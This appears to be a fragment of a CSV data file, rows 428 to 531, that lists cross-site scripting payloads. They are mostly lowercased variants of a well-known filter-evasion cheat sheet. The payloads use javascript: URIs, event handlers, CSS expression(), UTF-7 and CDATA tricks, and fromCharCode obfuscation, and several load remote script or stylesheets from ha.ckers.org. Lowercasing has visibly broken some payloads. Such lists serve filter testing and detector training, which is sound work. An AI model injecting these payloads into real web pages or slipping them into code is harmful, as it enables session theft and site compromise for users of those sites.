+428,"<xml id=xss><x><c><![cdata[<img id=xss src=""javas]]><![cdata[cript:alert('xss');"">]]></c></x><xml><span dataid=xss src=#i datafld=cdataformatas=html></span>"
+429,"<xml id=""xss""><i><b><img id=xss src=""javas<!-- -->cript:alert('xss')""></b></i></xml><span dataid=xss src=""#xss"" datafld=""b"" dataformatas=""html""></span>"
+430,"<xml id=xss src=""xsstest.xml"" id=i></xml><span dataid=xss src=#i datafld=c dataformatas=html></span>"
+431,"<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""xss<script defer>alert(""xss"")</script>""></body></html>"
+432,"<? echo('<scr)';echo('ipt>alert(""xss"")</script>'); ?>"
+433,"<meta http-equiv=""set-cookie"" content=""userid=<script>alert('xss')</script>"">"
+434,<script id=xss src=http://127.0.0.1></script>
+435,"//--></script>"">'><script>alert(string.fromcharcode(88,83,83))</script>"
+436,"<img id=xss src=javascript:alert(string.fromcharcode(88,83,83))>"
+437,"<img id=xss src=""&14;javascript:alert('xss');"">"
+438,"<script <b>=alert('xss');""></script>"
+439,"<iframe id=xss src=""javascript:alert('xss'); <"
+440,<script>a=/xss/nalert('xss');</script>
+441,"<style>li {list-style-image: url(""javascript:alert('xss');</style><ul><li>xss"
+442,"<div style=""background-image: url(javascript:alert('xss'));"">"
+443,"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""></head>+adw-script+ad4-alert('xss');+adw-/script+ad4-"
+444,"<a href=""javascript#alert('xss');"">"
+445,"<div onmouseover=""alert('xss');"">,"
+446,"<input type=""image"" dynid=xss src=""javascript:alert('xss');"">"
+447,"&<script>alert('xss');</script>"">"
+448,<img id=xss src=&{alert('xss');};>
+449,"<a id=xss href=""about:<script>alert('xss');</script>"">"
+450,"<div id=xss style=""binding: url(javascript:alert('xss'));"">"
+451,"<object classid=clsid:..."" codebase=""javascript:alert('xss');"">"
+452,<style><!--</style><script>alert('xss');//--></script>
+453,![cdata[<!--]]<script>alert('xss');//--></script>
+454,<!-- -- --><script>alert('xss');</script><!-- -- -->
+455,"<img id=xss src=""blah""onmouseover=""alert('xss');"">"
+456,"<img id=xss src=""blah>""onmouseover=""alert('xss');"">"
+457,"<xml id=""x""><a><b><script>alert('xss');</script>;<b></a></xml>"
+458,"<div datafld=""b"" dataformatas=""html"" dataid=xss src=""#xss""></div>"
+459,[a][a]script>alert('xss');[a][a]/script>
+460,"<xml id=i><x><c><![cdata[<img id=xss src=""javas]]<![cdata[cript:alert('xss');"">]]</c><x></xml>"
+461,"<form id=""test"" /><button form=""test"" formaction=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"">x"
+462,"<input id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>"
+463,"<select id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>"
+464,"<textarea id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>"
+465,"<keygen id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>"
+466,"<input id=xss onblur=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus><input autofocus>"
+467,"<video id=xss poster=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))//"
+468,"<body id=xss onscroll=eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>"
+469,"<video><source onerror=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"">"
+470,"<video onerror=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))""><source>"
+471,<iframe id=xss / /onload=alert(/xss/)></iframe>
+472,"<iframe id=xss / ""onload=alert(/xss/)></iframe>"
+473,<iframe id=xss///////onload=alert(/xss/)></iframe>
+474,"<iframe id=xss ""onload=alert(/xss/)></iframe>"
+475,<iframe id=xss <?php echo chr(11)?> onload=alert(/xss/)></iframe>
+476,<iframe id=xss <?php echo chr(12)?> onload=alert(/xss/)></iframe>
+477,""" onfocus=alert(xss) ""> <"""
+478,""" onblur=alert(xss) ""> <"""
+479,""" onmouseover=alert(xss) "">"
+480,""" onclick=alert(xss) "">"
+481,"<style>li {list-style-image: url(""javascript:alert('xss')"");}</style><ul><li>xss"
+482,"</textarea>'""><script>alert(xss)</script>"
+483,"'""""><script language=""javascript""> alert('x s s');</script>"
+484,</script></script><<<<script><>>>><<<script>alert(xss)</script>
+485,<html><noalert><noscript>(xss)</noscript><script>(xss)</script>
+486,'></select><script>alert(xss)</script>
+487,}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>
+488,"<script>document.write(""xss"");</script>"
+489,"a=""get"";b=""url"";c=""javascript:"";d=""alert('xss');"";eval(a+b+c+d);"
+490,"='><script>alert(""xss"")</script>"
+491,"<body background=javascript:'""><script>alert(xss)</script>></body>"
+492,"data:text/html;charset=utf-7;base64,ij48l3rpdgxlpjxzy3jpchq+ywxlcnqomtmznyk8l3njcmlwdd4="
+493,<script>alert('xss');</script>
+494,<script id=xss src=http://ha.ckers.org/xss.js></script>
+495,"<img id=xss src=`javascript:alert(""rsnake says, 'xss'"")`>"
+496,id=xss src= <img 6;avascript:alert('xss')>
+497,"<script/xss id=xss src=""http://ha.ckers.org/xss.js""></script>"
+498,<script id=xss src=http://ha.ckers.org/xss.js?<b>
+499,"<img id=xss src=""javascript:alert('xss')"""
+500,<script>a=/xss/
+501,"<img dynid=xss src=""javascript:alert('xss')"">"
+502,"<img lowid=xss src=""javascript:alert('xss')"">"
+503,"<br size=""&{alert('xss')}"">"
+504,"<layer id=xss src=""http://ha.ckers.org/scriptlet.html""></layer>"
+505,"<link rel=""stylesheet"" href=""http://ha.ckers.org/xss.css"">"
+506,<style>@import'http://ha.ckers.org/xss.css';</style>
+507,"<meta http-equiv=""link"" content=""<http://ha.ckers.org/xss.css>; rel=stylesheet"">"
+508,"<style>body{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</style>"
+509,"<img id=xss src=""mocha:[code]"">"
+510,"<img id=xss src=""livescript:[code]"">"
+511,"<meta http-equiv=""link"" content=""<javascript:alert('xss')>; rel=stylesheet"">"
+512,"<meta http-equiv=""refresh"" content=""0; url=http://;url=javascript:alert('xss');"">"
+513,"<div style=""background-image: url(javascript:alert('xss'))"">"
+514,"<div style=""width: expression(alert('xss'));"">"
+515,"<img style=""xss:expr/*xss*/ession(alert('xss'))"">"
+516,"<xss style=""xss:expression(alert('xss'))"">"
+517,"exp/*<xss style='no\\xss:noxss(""*//*"");"
+518,"<object type=""text/x-scriptlet"" data=""http://ha.ckers.org/scriptlet.html""></object>"
+519,"geturl(""javascript:alert('xss')"")"
+520,"a=""get"";"
+521,"<!--<value><![cdata[<xml id=i><x><c><![cdata[<img id=xss src=""javas<![cdata[cript:alert('xss');"">"
+522,"<xml id=xss src=""http://ha.ckers.org/xsstest.xml"" id=i></xml>"
+523,"<script id=xss src=""http://ha.ckers.org/xss.jpg""></script>"
+524,"<!--#exec cmd=""/bin/echo '<script src'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></script>'""-->"
+525,<? echo('<scr)';
+526,"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-alert('xss');+adw-/script+ad4-"
+527,"<script a="">"" id=xss src=""http://ha.ckers.org/xss.js""></script>"
+528,"<script a="">"" '' id=xss src=""http://ha.ckers.org/xss.js""></script>"
+529,"<script ""a='>'"" id=xss src=""http://ha.ckers.org/xss.js""></script>"
+530,"<script a=`>` id=xss src=""http://ha.ckers.org/xss.js""></script>"
+531,"<script>document.write(""<scri"");</script>pt id=xss src=""http://ha.ckers.org/xss.js""></script>"
